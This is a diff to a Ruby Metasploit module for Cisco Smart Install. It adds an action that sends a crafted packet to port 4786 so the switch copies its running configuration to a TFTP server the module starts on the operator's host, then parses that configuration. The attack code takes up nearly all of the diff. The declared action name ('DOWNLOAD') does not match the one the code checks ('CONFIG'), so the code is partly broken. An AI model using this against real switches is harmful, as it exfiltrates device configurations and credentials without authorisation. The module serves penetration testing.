@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Auxiliary
           and determines if it speaks the Smart Install Protocol.  Exposure of SMI
           to untrusted networks can allow complete compromise of the switch.
         ),
-        'Author'         => 'Jon Hart <jon_hart[at]rapid7.com>',
+        'Author'         => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],
         'References'     =>
           [
             ['URL', 'https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
@@ -28,13 +28,20 @@ class MetasploitModule < Msf::Auxiliary
             ['URL', 'https://github.com/Sab0tag3d/SIET']
 
           ],
-        'License'        => MSF_LICENSE
+        'License'        => MSF_LICENSE,
+        'DefaultAction' => 'SCAN',
+        'Actions' => [
+          ['SCAN', {'Description' => 'Scan for instances communicating via Smart Install Protocol (default)'}],
+          ['DOWNLOAD', {'Description' => 'Retrieve configuration via Smart Install Protocol'}]
+        ],
       )
     )
 
     register_options(
       [
-        Opt::RPORT(4786)
+        Opt::RPORT(4786),
+        OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
+        OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 60])
       ]
     )
   end
@@ -56,11 +63,91 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("No response")
     end
   end
+  
+  def start_tftp
+    print_status("Starting TFTP Server...")
+    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
+    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+    @tftp.start
+    add_socket(@tftp.sock)
 
-  def run_host(_ip)
+    @main_thread = ::Thread.current
+  end
+
+  def cleanup
+    # Cleanup is called once for every single thread
+    if ::Thread.current == @main_thread
+      # Wait 5 seconds for background transfers to complete
+      print_status("Providing some time for transfers to complete...")
+      ::IO.select(nil, nil, nil, 5.0)
+
+      print_status("Shutting down the TFTP service...")
+      if @tftp
+        @tftp.close rescue nil
+        @tftp = nil
+      end
+    end
+  end
+
+  #
+  # Callback for incoming files
+  #
+  def process_incoming(info)
+    return if not info[:file]
+    name = info[:file][:name]
+    data = info[:file][:data]
+    from = info[:from]
+    return if not (name and data)
+
+    # Trim off IPv6 mapped IPv4 if necessary
+    from = from[0].dup
+    from.gsub!('::ffff:', '')
+
+    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
+    cisco_ios_config_eater(from, 4786, data)
+    # Save the configuration file if a path is specified
+    #if datastore['OUTPUTDIR']
+    #  name = "#{from}.txt"
+    #  ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
+    #  path = ::File.join(datastore['OUTPUTDIR'], name)
+    #  ::File.open(path, "wb") do |fd|
+    #    fd.write(data)
+    #  end
+    #  print_status("Saved configuration file to #{path}")
+    #end
+  end
+
+  def decode_hex(string)
+    string.scan(/../).map { |x| x.hex }.pack('c*')
+  end
+
+  def craft_packet
+    config_name = "#{Rex::Text.rand_text_alpha(8)}.conf"
+    copy_config = "copy system:running-config flash:/#{config_name}"
+    transfer_config = "copy flash:/#{config_name} tftp://#{@lhost}/#{config_name}"
+    packet_header = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
+    packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (transfer_config + decode_hex(('00' * (336 - transfer_config.length)))) + (decode_hex(('00' * 336)))
+    return packet
+  end
+
+
+  def run_host(ip)
+    @lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
     begin
-      connect
-      return unless smi?
+      case
+        when action.name == 'SCAN'
+          connect
+          return unless smi?
+        when action.name == 'CONFIG'
+          start_tftp
+          connect
+          packet = craft_packet
+          print_status("Requesting configuration from device...")
+          vprint_status("Sending packet of #{packet.length} bytes")
+          sock.put(packet)
+          print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
+          Rex.sleep(datastore['SLEEP'])
+      end
     rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \
            ::Errno::ETIMEDOUT, ::Timeout::Error, ::EOFError => e
       vprint_error("error while connecting and negotiating Cisco Smart Install: #{e}")
